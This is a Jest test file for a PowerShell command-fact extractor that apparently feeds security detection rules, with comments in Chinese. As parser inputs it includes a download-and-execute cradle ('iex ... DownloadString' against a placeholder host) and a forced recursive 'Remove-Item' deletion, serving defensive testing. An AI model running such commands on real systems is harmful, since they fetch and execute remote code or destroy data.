// P3-T2：PowerShell 命令事实提取器测试（TDD）。
import { resetScriptParserServiceForTests, scriptParserService } from './scriptParserService'
import { extractPowershellCommandFacts } from './powershellCommandFacts'

beforeAll(async () => {
  resetScriptParserServiceForTests()
  await scriptParserService.ensureInitialized()
})

describe('powershellCommandFacts（P3-T2）', () => {
  it('cmdlet 调用：名称与参数提取', () => {
    const f = extractPowershellCommandFacts('Get-ChildItem -Path . -Filter *.log')
    expect(f.ok).toBe(true)
    expect(f.commands[0]!.name).toBe('Get-ChildItem')
    expect(f.commands[0]!.args).toContain('-Path')
    expect(f.commands[0]!.args).toContain('.')
    expect(f.commands[0]!.args).toContain('*.log')
  })

  it('IEX 下载执行：结构可提取（ps-iex-cradle 的输入）', () => {
    const f = extractPowershellCommandFacts("iex (New-Object Net.WebClient).DownloadString('http://x/p')")
    expect(f.ok).toBe(true)
    expect(f.commands[0]!.name.toLowerCase()).toBe('iex')
    expect(f.commands[0]!.args.join(' ')).toContain('DownloadString')
  })

  it('管道链：ForEach-Object 管道提取', () => {
    const f = extractPowershellCommandFacts('Get-Process | Sort-Object CPU -Descending | Select-Object -First 5')
    expect(f.ok).toBe(true)
    expect(f.commands.map((c) => c.name)).toEqual(['Get-Process', 'Sort-Object', 'Select-Object'])
    expect(f.pipelines).toHaveLength(1)
    expect(f.connectorFlow).toEqual(['|', '|'])
  })

  it('&& / || 列表提取', () => {
    const f = extractPowershellCommandFacts('Get-Date && Get-Location || Write-Output fallback')
    expect(f.ok).toBe(true)
    expect(f.lists).toEqual(['&&', '||'])
    expect(f.connectorFlow).toEqual(['&&', '||'])
  })

  it('重定向：op/target 提取', () => {
    const f = extractPowershellCommandFacts('Get-Content log.txt > out.txt')
    expect(f.ok).toBe(true)
    expect(f.commands[0]!.redirects).toEqual([{ op: '>', target: 'out.txt' }])
  })

  it('变量与子表达式 substitutions', () => {
    const f = extractPowershellCommandFacts('Write-Output $($env.PATH)')
    expect(f.ok).toBe(true)
    expect(f.substitutions.some((s) => s.kind === 'sub-expression')).toBe(true)
    const f2 = extractPowershellCommandFacts('Write-Output $env.PATH')
    expect(f2.substitutions.some((s) => s.kind === 'variable')).toBe(true)
  })

  it('Remove-Item -Recurse：结构可见（ps-destructive 的输入）', () => {
    const f = extractPowershellCommandFacts('Remove-Item -Recurse -Force C:\\temp')
    expect(f.ok).toBe(true)
    expect(f.commands[0]!.name).toBe('Remove-Item')
    expect(f.commands[0]!.args).toEqual(expect.arrayContaining(['-Recurse', '-Force', 'C:\\temp']))
  })

  it('解析失败：ok:false（fail-closed）', () => {
    const f = extractPowershellCommandFacts('Write-Output "unclosed')
    expect(f.ok).toBe(false)
    expect(f.commands).toEqual([])
  })

  it('反向用例：未识别语句级构造进入 unresolved（而非消失）', () => {
    const f = extractPowershellCommandFacts('$name = "value"')
    expect(f.ok).toBe(true)
    expect(f.unresolved.some((u) => u.includes('assignment_expression'))).toBe(true)
  })
})
